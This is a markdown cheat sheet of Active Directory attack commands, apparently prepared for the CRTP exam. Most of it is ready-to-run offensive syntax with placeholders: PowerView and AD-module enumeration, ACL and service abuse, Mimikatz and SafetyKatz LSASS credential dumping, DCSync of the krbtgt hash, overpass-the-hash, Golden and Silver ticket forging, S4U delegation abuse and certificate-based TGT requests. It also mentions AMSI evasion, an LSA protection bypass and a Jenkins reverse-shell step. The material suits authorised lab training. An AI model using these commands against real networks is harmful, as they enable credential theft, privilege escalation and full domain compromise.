# 00 — Quick Reference & Exam Command Cheat Sheet

> [!TIP]
> **Exam Strategy:** Use this quick reference during the CRTP exam for fast syntax lookup. Replace placeholders such as `<DOMAIN>`, `<USER>`, `<TARGET>`, `<AES256_KEY>`, `<DOMAIN_SID>`, and `<KRBTGT_AES256>` with your target lab/exam environment values.

---

## Table of Contents

- [CRTP Exam Master Enumeration & Privilege Escalation Checklist](#crtp-exam-master-enumeration--privilege-escalation-checklist)
- [PowerView vs. ActiveDirectory Module Comparison Matrix](#powerview-vs-activedirectory-module-comparison-matrix)
- [ACL & Object Permission Privilege Abuse Matrix](#acl--object-permission-privilege-abuse-matrix)
- [PowerShell Script & Module Loading](#powershell-script--module-loading)
- [Core Domain Enumeration](#core-domain-enumeration)
- [ACL & Object Rights Enumeration](#acl--object-rights-enumeration)
- [OU & GPO Enumeration](#ou--gpo-enumeration)
- [Domain & Forest Trust Enumeration](#domain--forest-trust-enumeration)
- [Local Admin, Sessions & Share Discovery](#local-admin-sessions--share-discovery)
- [Local Privilege Escalation (PowerUp / SCM)](#local-privilege-escalation-powerup--scm)
- [Credential Extraction Quick Commands](#credential-extraction-quick-commands)
- [Kerberos Ticket Abuse (OPTH / Golden / Silver)](#kerberos-ticket-abuse-opth--golden--silver)
- [Constrained Delegation & S4U](#constrained-delegation--s4u)
- [AD CS Certificate Abuse](#ad-cs-certificate-abuse)
- [Post-Exploitation Credentials & Vaults](#post-exploitation-credentials--vaults)

---

## CRTP Exam Master Enumeration & Privilege Escalation Checklist

### Phase 1 — Environment Preparation & Recon Checklist
- [ ] `Set-ExecutionPolicy -Scope Process Bypass` executed
- [ ] PowerView dot-sourced (`. .\PowerView.ps1`) or AD Module loaded (`Import-Module .\ActiveDirectory.psd1`)
- [ ] Check security controls / AMSI evasion (`DefenderCheck.exe`, `Invisi-Shell`)

### Phase 2 — Comprehensive Domain Enumeration Checklist
- [ ] **Domain & DC Details:** Query domain name, forest SID, DC hostnames (`Get-Domain`, `Get-DomainController`)
- [ ] **Domain Users:** Enumerate all users (`Get-DomainUser | Select samaccountname`)
- [ ] **Kerberoastable SPNs:** Find user accounts with SPNs (`Get-DomainUser -SPN`)
- [ ] **AS-REP Roastable:** Find accounts with `DONT_REQ_PREAUTH` (`Get-DomainUser -PreauthNotRequired`)
- [ ] **AdminCount Accounts:** Identify accounts protected by AdminSDHolder (`Get-DomainUser -AdminCount`)
- [ ] **Domain Computers:** Enumerate hostnames, OS versions (`Get-DomainComputer`)
- [ ] **Domain Groups:** Enumerate Domain Admins, Enterprise Admins, Account Operators, DNSAdmins (`Get-DomainGroupMember`)
- [ ] **OUs & GPOs:** List Organizational Units and linked Group Policy Objects (`Get-DomainOU`, `Get-DomainGPO`)
- [ ] **Domain Object ACLs:** Scan for non-default privileges (`Find-InterestingDomainAcl -ResolveGUIDs`)
- [ ] **Domain & Forest Trusts:** Map inbound/outbound domain and forest trusts (`Get-DomainTrust`, `Get-ForestTrust`)
- [ ] **Network Shares:** Scan domain machines for readable shares (`Find-DomainShare`)
- [ ] **Active Sessions:** Locate active sessions of privileged domain users (`Get-NetSession`, `Invoke-SessionHunter`)
- [ ] **Local Admin Access:** Discover machines where current user has administrative rights (`Find-LocalAdminAccess`)

### Phase 3 — Privilege Escalation & Privilege Abuse Checklist
- [ ] **Local PrivEsc:** Run PowerUp (`Invoke-AllChecks`) for unquoted service paths, modifiable services, DLL hijacking
- [ ] **ACL Misconfigurations:** Check for `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`, `AddMembers`
- [ ] **GPO Abuse:** Check for write access over GPOs (`write_gpo_dacl`, LNK relay, SYSVOL scripts)
- [ ] **Jenkins / CI/CD Abuse:** Check build steps, execute reverse shell via batch command
- [ ] **Unconstrained Delegation:** Identify machines with `TRUSTED_FOR_DELEGATION` and harvest TGTs
- [ ] **Constrained Delegation (S4U):** Identify accounts with `TRUSTED_TO_AUTH_FOR_DELEGATION`, execute Rubeus S4U
- [ ] **Resource-Based Constrained Delegation (RBCD):** Configure `msDS-AllowedToActOnBehalfOfOtherIdentity` on target computer
- [ ] **AD CS Certificate Abuse (ESC1):** Audit certificate templates (`Certify.exe find /vulnerable`), request PFX, PKINIT TGT

### Phase 4 — Credential Access & Lateral Movement Checklist
- [ ] **LSASS Dumping:** Extract credentials via `SafetyKatz.exe` or `sekurlsa::logonpasswords`
- [ ] **LSASS PPL Bypass:** Load driver `mimidrv.sys` if LSA protection is active
- [ ] **Overpass-the-Hash (OPTH):** Request Kerberos TGT using NTLM hash / AES key (`Rubeus.exe asktgt`)
- [ ] **DCSync:** Dump `krbtgt` / Domain Admin hashes if account has replication permissions
- [ ] **Lateral Movement:** Connect to target via WinRM (`Enter-PSSession`), WMI (`Invoke-WmiMethod`), or SCM (`sc.exe`)
- [ ] **Golden Ticket:** Forge TGT with `krbtgt` key (`Rubeus.exe golden`)
- [ ] **Silver Ticket:** Forge TGS for specific service (`Rubeus.exe silver`)
- [ ] **Credential Hunting:** Check `ConsoleHost_history.txt`, registry keys, KeePass `.kdbx`, Windows Vaults (`vaultcmd`)
- [ ] **NTDS Dumping:** Extract SAM/SYSTEM or `ntds.dit` via Volume Shadow Copy (VSS)

---

## PowerView vs. ActiveDirectory Module Comparison Matrix

| Action / Query | PowerView (Dev branch) | ActiveDirectory RSAT Module |
| :--- | :--- | :--- |
| **Get Current Domain** | `Get-Domain` | `Get-ADDomain` |
| **Get Domain Controllers** | `Get-DomainController` | `Get-ADDomainController` |
| **Get Users** | `Get-DomainUser` | `Get-ADUser -Filter *` |
| **Get Specific User** | `Get-DomainUser -Identity <USER>` | `Get-ADUser -Identity <USER> -Properties *` |
| **Get User SPNs (Kerberoasting)**| `Get-DomainUser -SPN` | `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` |
| **Get AdminCount Users** | `Get-DomainUser -AdminCount` | `Get-ADUser -Filter {AdminCount -eq 1}` |
| **Get Domain Computers** | `Get-DomainComputer` | `Get-ADComputer -Filter * -Properties *` |
| **Get Domain Groups** | `Get-DomainGroup` | `Get-ADGroup -Filter *` |
| **Get Group Members** | `Get-DomainGroupMember -Identity <GROUP>` | `Get-ADGroupMember -Identity <GROUP>` |
| **Get OUs** | `Get-DomainOU` | `Get-ADOrganizationalUnit -Filter *` |
| **Get GPOs** | `Get-DomainGPO` | `Get-ADGPO -All` |
| **Get Domain Trusts** | `Get-DomainTrust` | `Get-ADTrust -Filter *` |
| **Get Forest Trusts** | `Get-ForestTrust` | `Get-ADForest | %{ Get-ADTrust -Filter * }` |
| **Get Domain Object ACLs** | `Get-DomainObjectAcl -Identity <NAME>` | `(Get-ACL 'AD:\CN=...').Access` |

---

## ACL & Object Permission Privilege Abuse Matrix

| Privilege / Right | Impact / Vector | Execution Command |
| :--- | :--- | :--- |
| **GenericAll** | Full control over target object | Modify group membership, reset password, or shadow credentials |
| **GenericWrite** | Update object attributes | `Set-DomainObject -Identity <TARGET> -Set @{'scriptpath'='...'} ` |
| **WriteDacl** | Modify object DACL / permissions | `Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All` |
| **WriteOwner** | Take ownership of target object | `Set-DomainObjectOwner -TargetIdentity <TARGET> -PrincipalIdentity <USER>` |
| **ForceChangePassword** | Reset target user's password without knowing old password | `$pw = ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force`<br>`Set-ADAccountPassword -Identity <USER> -Reset -NewPassword $pw` |
| **AddMembers** | Add arbitrary accounts to privileged domain groups | `Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'` |
| **DCSync (GetChangesAll)** | Replicate secret hashes directly from DC | `lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt` |

---

## PowerShell Script & Module Loading

```powershell
# Dot-source a script in memory/session
. C:\AD\Tools\PowerView.ps1

# Import Microsoft Active Directory module without RSAT installation
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# List available commands inside an imported module
Get-Command -Module ActiveDirectory
```
> **Source:** handwritten pp. 7–8.

---

## Core Domain Enumeration

```powershell
# Enumerate basic domain architecture
Get-Domain
Get-DomainController

# User enumeration
Get-DomainUser
Get-DomainUser -Identity <USER>
Get-DomainUser -AdminCount
Get-DomainUser | Select-Object -ExpandProperty samaccountname

# Computer enumeration
Get-DomainComputer
Get-DomainComputer | Select-Object -ExpandProperty dnshostname

# Group enumeration
Get-DomainGroup
Get-DomainGroup -Identity 'Domain Admins'
Get-DomainGroupMember -Identity 'Domain Admins'
```
> **Source:** handwritten pp. 9–13.

---

## ACL & Object Rights Enumeration

```powershell
# Inspect ACLs on sensitive groups (e.g. Domain Admins)
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs

# Find ACL entries matching a specific user or group
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { $_.IdentityReferenceName -match '<USER_OR_GROUP>' }

# Find interesting / non-default ACLs across the domain
Find-InterestingDomainAcl -ResolveGUIDs |
  Where-Object { $_.IdentityReferenceName -match '<USER_OR_GROUP>' }
```
> **Source:** handwritten p. 11.

---

## OU & GPO Enumeration

```powershell
# Enumerate Organizational Units
Get-DomainOU
Get-DomainOU | Select-Object -ExpandProperty name

# Inspect Group Policy Objects & GPLink on an OU
Get-DomainGPO
Get-DomainGPO -Identity '<GPO_NAME_OR_GUID>'
(Get-DomainOU -Identity <OU>).gplink

# List computers residing within a specific OU
(Get-DomainOU -Identity <OU>).distinguishedname |
  ForEach-Object { Get-DomainComputer -SearchBase $_ } |
  Select-Object name
```
> **Source:** handwritten p. 12.

---

## Domain & Forest Trust Enumeration

```powershell
# PowerView trust enumeration
Get-DomainTrust
Get-ForestDomain -Verbose
Get-ForestDomain | ForEach-Object { Get-DomainTrust -DomainName $_.Name }

# AD Module trust enumeration
(Get-ADForest).Domains
Get-ADTrust -Filter *
Get-ADForest | ForEach-Object { Get-ADTrust -Filter * }
```
> **Source:** handwritten pp. 13–14.

---

## Local Admin, Sessions & Share Discovery

> [!NOTE]
> Local admin access permits local LSASS credential dumping, lateral movement, and persistent remote execution via PSRemoting or WMI.

```powershell
# Find machines where current user has local admin rights
Find-LocalAdminAccess

# Enumerate active network sessions and shared folders
Get-NetSession
Find-DomainShare

# Check PSRemoting administrative access
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```cmd
# Connect remotely via WinRM CLI
winrs -r:<TARGET> cmd
```

```powershell
# Connect remotely via PowerShell Remoting
Enter-PSSession -ComputerName <TARGET>
```
> **Source:** handwritten pp. 10, 16.

---

## Local Privilege Escalation (PowerUp / SCM)

```powershell
# Run all PowerUp local privilege escalation checks
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks

# Service abuse pattern to elevate to local admin/SYSTEM
Invoke-ServiceAbuse -Name '<VULNERABLE_SERVICE>' -Username '<DOMAIN>\<USER>' -Verbose
```
> **Source:** handwritten p. 14.

---

## Credential Extraction Quick Commands

```cmd
# Evasive / direct sekurlsa execution
mimikatz.exe "sekurlsa::ekeys" "exit"
SafetyKatz.exe "sekurlsa::ekeys" "exit"
```

```text
# Interactive Mimikatz commands
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::secrets
```
> **Source:** handwritten pp. 22, 39, 56.

---

## Kerberos Ticket Abuse (OPTH / Golden / Silver)

### Overpass-the-Hash (OPTH)
```text
# Mimikatz OPTH
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe

# Rubeus OPTH (Standard & Opsec/Elevated NetOnly)
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /ptt
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### DCSync
```text
# Dump krbtgt hash using DCSync (Requires Replicate Directory Changes rights)
lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt
```

### Golden Ticket
```cmd
# Forge TGT using krbtgt key
Rubeus.exe golden /aes256:<KRBTGT_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
```

### Silver Ticket
```cmd
# Forge Service Ticket using target service account key
Rubeus.exe silver /service:http/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN>
```
> [!IMPORTANT]
> For WMI lateral movement via Silver Ticket, tickets for **both** `HOST` and `RPCSS` services must be generated.

> **Source:** handwritten pp. 23–24, 31–32.

---

## Constrained Delegation & S4U

```powershell
# Find accounts trusted for constrained delegation
Get-NetUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

```cmd
# Execute S4U2Self & S4U2Proxy using Rubeus
Rubeus.exe s4u /user:<DELEGATED_ACCOUNT> /aes256:<KEY> /impersonateuser:Administrator /msdsspn:time/<TARGET_DC> /ptt
```
> **Source:** handwritten pp. 38–41.

---

## AD CS Certificate Abuse

```cmd
# Request TGT using exported PFX certificate
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<CERT_PFX> /password:<CERT_PASSWORD> /outfile:<TGT_FILE> /domain:<DOMAIN> /dc:<DC_IP> /ptt
```
> **Source:** handwritten pp. 45–47.

---

## Post-Exploitation Credentials & Vaults

```cmd
# Windows Credential Vault listing
vaultcmd /list
vaultcmd /listproperties:"Web Credentials"
```

```text
# PowerShell command history file path
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
> **Source:** handwritten pp. 52, 57–58.
